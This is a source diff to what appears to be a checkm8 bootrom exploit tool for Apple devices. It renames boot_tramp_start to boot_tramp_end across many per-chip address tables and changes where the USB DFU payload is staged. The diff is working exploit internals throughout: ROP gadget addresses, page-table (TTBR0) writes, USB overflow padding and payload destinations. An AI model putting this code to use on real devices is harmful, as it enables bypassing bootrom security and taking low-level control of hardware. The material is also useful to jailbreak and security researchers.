@@ -55,8 +55,8 @@
 #define DFU_MAX_TRANSFER_SZ (0x800)
 #define DFU_STATE_MANIFEST_SYNC (6)
 #define AES_KEY_SZ_256 (0x20000000U)
+#define ARM_16K_TT_L2_SZ (0x2000000U)
 #define TASK_STACK_MAGIC (0x7374616B)
-#define ARM_16K_TT_L2_SZ (0x2000000ULL)
 #define DFU_STATE_MANIFEST_WAIT_RESET (8)
 #define DONE_MAGIC (0x646F6E65646F6E65ULL)
 #define EXEC_MAGIC (0x6578656365786563ULL)
@@ -210,7 +210,7 @@ static struct {
 	uint8_t i_manufacturer, i_product, i_serial_number, b_num_configurations;
 } device_descriptor;
 static size_t config_hole, ttbr0_vrom_off, ttbr0_sram_off, config_large_leak, config_overwrite_pad = offsetof(eclipsa_overwrite_t, synopsys_task.callout);
-static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, io_buffer_addr, boot_tramp_start, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, arch_task_tramp_addr, insecure_memory_base, synopsys_routine_addr, exit_critical_section, enter_critical_section, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor;
+static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, io_buffer_addr, boot_tramp_end, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, arch_task_tramp_addr, insecure_memory_base, synopsys_routine_addr, exit_critical_section, enter_critical_section, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor;
 
 static void
 sleep_ms(unsigned ms) {
@@ -613,7 +613,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			patch_addr = 0x100005CE0;
 			memcpy_addr = 0x10000ED50;
 			aes_crypto_cmd = 0x10000B9A8;
-			boot_tramp_start = 0x1800E0000;
+			boot_tramp_end = 0x1800E1000;
 			gUSBSerialNumber = 0x180086CDC;
 			dfu_handle_request = 0x180086C70;
 			usb_core_do_transfer = 0x10000CC78;
@@ -627,7 +627,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			memcpy_addr = 0x100010E70;
 			aes_crypto_cmd = 0x10000DA90;
 			io_buffer_addr = 0x18010D300;
-			boot_tramp_start = 0x1800E0000;
+			boot_tramp_end = 0x1800E1000;
 			gUSBSerialNumber = 0x1800888C8;
 			dfu_handle_request = 0x180088878;
 			usb_core_do_transfer = 0x10000EBB4;
@@ -643,7 +643,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			memcpy_addr = 0x100013F10;
 			aes_crypto_cmd = 0x100010A90;
 			io_buffer_addr = 0x18010D500;
-			boot_tramp_start = 0x1800E0000;
+			boot_tramp_end = 0x1800E1000;
 			gUSBSerialNumber = 0x180088E48;
 			dfu_handle_request = 0x180088DF8;
 			usb_core_do_transfer = 0x100011BB4;
@@ -661,7 +661,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			aes_crypto_cmd = 0x10000DAA0;
 			ttbr0_vrom_off = 0x400;
 			io_buffer_addr = 0x18010D500;
-			boot_tramp_start = 0x1800E0000;
+			boot_tramp_end = 0x1800E1000;
 			gUSBSerialNumber = 0x180087958;
 			dfu_handle_request = 0x1800878F8;
 			usb_core_do_transfer = 0x10000EE78;
@@ -679,7 +679,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			aes_crypto_cmd = 0x10000DAA0;
 			ttbr0_vrom_off = 0x400;
 			io_buffer_addr = 0x18010D500;
-			boot_tramp_start = 0x1800E0000;
+			boot_tramp_end = 0x1800E1000;
 			gUSBSerialNumber = 0x180087958;
 			dfu_handle_request = 0x1800878F8;
 			usb_core_do_transfer = 0x10000EE78;
@@ -702,9 +702,9 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			write_ttbr0 = 0x1000003B4;
 			memcpy_addr = 0x1000106F0;
 			aes_crypto_cmd = 0x10000C9D4;
+			boot_tramp_end = 0x180044000;
 			ttbr0_vrom_off = 0x400;
 			ttbr0_sram_off = 0x600;
-			boot_tramp_start = 0x180040000;
 			gUSBSerialNumber = 0x180047578;
 			dfu_handle_request = 0x18004C378;
 			usb_core_do_transfer = 0x10000DDA4;
@@ -727,9 +727,9 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			write_ttbr0 = 0x1000003E4;
 			memcpy_addr = 0x100010730;
 			aes_crypto_cmd = 0x10000C8F4;
+			boot_tramp_end = 0x1800B0000;
 			ttbr0_vrom_off = 0x400;
 			ttbr0_sram_off = 0x600;
-			boot_tramp_start = 0x1800AC000;
 			gUSBSerialNumber = 0x180083CF8;
 			dfu_handle_request = 0x180088B48;
 			usb_core_do_transfer = 0x10000DC98;
@@ -752,9 +752,9 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			write_ttbr0 = 0x1000003F4;
 			memcpy_addr = 0x100010950;
 			aes_crypto_cmd = 0x10000C994;
+			boot_tramp_end = 0x1800B0000;
 			ttbr0_vrom_off = 0x400;
 			ttbr0_sram_off = 0x600;
-			boot_tramp_start = 0x1800AC000;
 			gUSBSerialNumber = 0x180083D28;
 			dfu_handle_request = 0x180088A58;
 			usb_core_do_transfer = 0x10000DD64;
@@ -777,9 +777,9 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			write_ttbr0 = 0x100000444;
 			memcpy_addr = 0x10000EA30;
 			aes_crypto_cmd = 0x1000082AC;
+			boot_tramp_end = 0x18001C000;
 			ttbr0_vrom_off = 0x400;
 			ttbr0_sram_off = 0x600;
-			boot_tramp_start = 0x180018000;
 			gUSBSerialNumber = 0x180003AF8;
 			dfu_handle_request = 0x180008B08;
 			usb_core_do_transfer = 0x10000BD20;
@@ -802,9 +802,9 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			write_ttbr0 = 0x10000045C;
 			memcpy_addr = 0x10000E9D0;
 			aes_crypto_cmd = 0x100009E9C;
+			boot_tramp_end = 0x18001C000;
 			ttbr0_vrom_off = 0x400;
 			ttbr0_sram_off = 0x600;
-			boot_tramp_start = 0x180018000;
 			gUSBSerialNumber = 0x180003A78;
 			dfu_handle_request = 0x180008638;
 			usb_core_do_transfer = 0x10000B9A8;
@@ -1182,7 +1182,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 		memcpy(A9.payload, payload_A9, sizeof(payload_A9));
 		memset(A9.pwnd, '\0', sizeof(A9.pwnd));
 		memcpy(A9.pwnd, pwnd_str, strlen(pwnd_str));
-		A9.payload_dest = boot_tramp_start + sizeof(handle_checkm8_request);
+		A9.payload_dest = boot_tramp_end - sizeof(handle_checkm8_request);
 		A9.dfu_handle_request = dfu_handle_request;
 		A9.payload_off = sizeof(A9);
 		A9.payload_sz = sizeof(handle_checkm8_request);
@@ -1198,7 +1198,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 		memcpy(notA9.payload, payload_notA9, sizeof(payload_notA9));
 		memset(notA9.pwnd, '\0', sizeof(notA9.pwnd));
 		memcpy(notA9.pwnd, pwnd_str, strlen(pwnd_str));
-		notA9.payload_dest = boot_tramp_start + sizeof(handle_checkm8_request);
+		notA9.payload_dest = boot_tramp_end - sizeof(handle_checkm8_request);
 		notA9.dfu_handle_request = dfu_handle_request;
 		notA9.payload_off = sizeof(notA9);
 		notA9.payload_sz = sizeof(handle_checkm8_request);
